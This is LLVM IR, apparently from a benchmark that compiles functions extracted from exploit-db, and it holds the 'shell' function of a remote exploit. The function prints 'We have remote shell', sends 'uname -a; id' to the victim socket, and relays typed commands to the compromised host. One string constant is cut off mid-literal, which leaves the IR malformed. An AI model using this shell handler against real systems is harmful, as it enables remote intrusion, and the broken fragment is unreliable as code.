; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_1114.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_1114.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shell.testcmd = internal global [256 x i8] c"/bin/uname -a ; idalign 16
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [29 x i8] c"We have remote shell&%#$&%!\0A\00", align 1
@.str.1 = private unnamed_addr constant [85 x i8] c"\0AType in any command and it will get executed.\0AHave fun... DiGiT - teddi@linux.is\0A\0A\0A\00", align 1
@sockfd = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [28 x i8] c"Connection has been closed\0A\00", align 1
@.str.3 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"Error %$#\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @shell() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [1024 x i8], align 16
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = load i32, i32* @stdout, align 4
  %6 = call i32 (i32, i8*, ...) @fprintf(i32 %5, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  %7 = load i32, i32* @stdout, align 4
  %8 = call i32 (i32, i8*, ...) @fprintf(i32 %7, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.1, i64 0, i64 0))
  %9 = load i64, i64* @sockfd, align 8
  %10 = call i32 @strlen(i8* getelementptr inbounds ([256 x i8], [256 x i8]* @shell.testcmd, i64 0, i64 0))
  %11 = call i32 @write(i64 %9, i8* getelementptr inbounds ([256 x i8], [256 x i8]* @shell.testcmd, i64 0, i64 0), i32 %10)
  br label %12

12:                                               ; preds = %0, %80
  %13 = call i32 @FD_ZERO(i32* %1)
  %14 = load i64, i64* @sockfd, align 8
  %15 = call i32 @FD_SET(i64 %14, i32* %1)
  %16 = call i32 @FD_SET(i64 0, i32* %1)
  %17 = load i64, i64* @sockfd, align 8
  %18 = add nsw i64 %17, 1
  %19 = call i32 @select(i64 %18, i32* %1, i32* null, i32* null, i32* null)
  %20 = load i64, i64* @sockfd, align 8
  %21 = call i64 @FD_ISSET(i64 %20, i32* %1)
  %22 = icmp ne i64 %21, 0
  br i1 %22, label %23, label %62

23:                                               ; preds = %12
  %24 = load i64, i64* @sockfd, align 8
  %25 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %26 = call i32 @read(i64 %24, i8* %25, i32 1024)
  store i32 %26, i32* %3, align 4
  %27 = icmp slt i32 %26, 0
  br i1 %27, label %28, label %31

28:                                               ; preds = %23
  %29 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  %30 = call i32 @exit(i32 0) #3
  unreachable

31:                                               ; preds = %23
  store i32 0, i32* %4, align 4
  br label %32

32:                                               ; preds = %48, %31
  %33 = load i32, i32* %4, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp slt i32 %33, %34
  br i1 %35, label %36, label %51

36:                                               ; preds = %32
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %43, label %47

43:                                               ; preds = %36
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 %45
  store i8 ptrtoint ([1 x i8]* @.str.3 to i8), i8* %46, align 1
  br label %47

47:                                               ; preds = %43, %36
  br label %48

48:                                               ; preds = %47
  %49 = load i32, i32* %4, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %4, align 4
  br label %32

51:                                               ; preds = %32
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 %53
  store i8 0, i8* %54, align 1
  %55 = load i32, i32* %3, align 4
  %56 = sub nsw i32 %55, 1
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 %57
  store i8 10, i8* %58, align 1
  %59 = load i32, i32* @stdout, align 4
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %59, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i8* %60)
  br label %62

62:                                               ; preds = %51, %12
  %63 = call i64 @FD_ISSET(i64 0, i32* %1)
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %80

65:                                               ; preds = %62
  %66 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %67 = call i32 @read(i64 0, i8* %66, i32 1024)
  store i32 %67, i32* %3, align 4
  %68 = icmp sgt i32 %67, 0
  br i1 %68, label %69, label %79

69:                                               ; preds = %65
  %70 = load i64, i64* @sockfd, align 8
  %71 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %72 = load i32, i32* %3, align 4
  %73 = call i32 @write(i64 %70, i8* %71, i32 %72)
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %78

75:                                               ; preds = %69
  %76 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0))
  %77 = call i32 @exit(i32 0) #3
  unreachable

78:                                               ; preds = %69
  br label %79

79:                                               ; preds = %78, %65
  br label %80

80:                                               ; preds = %79, %62
  br label %12
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @write(i64, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i64, i32*) #1

declare dso_local i32 @select(i64, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i64, i32*) #1

declare dso_local i32 @read(i64, i8*, i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
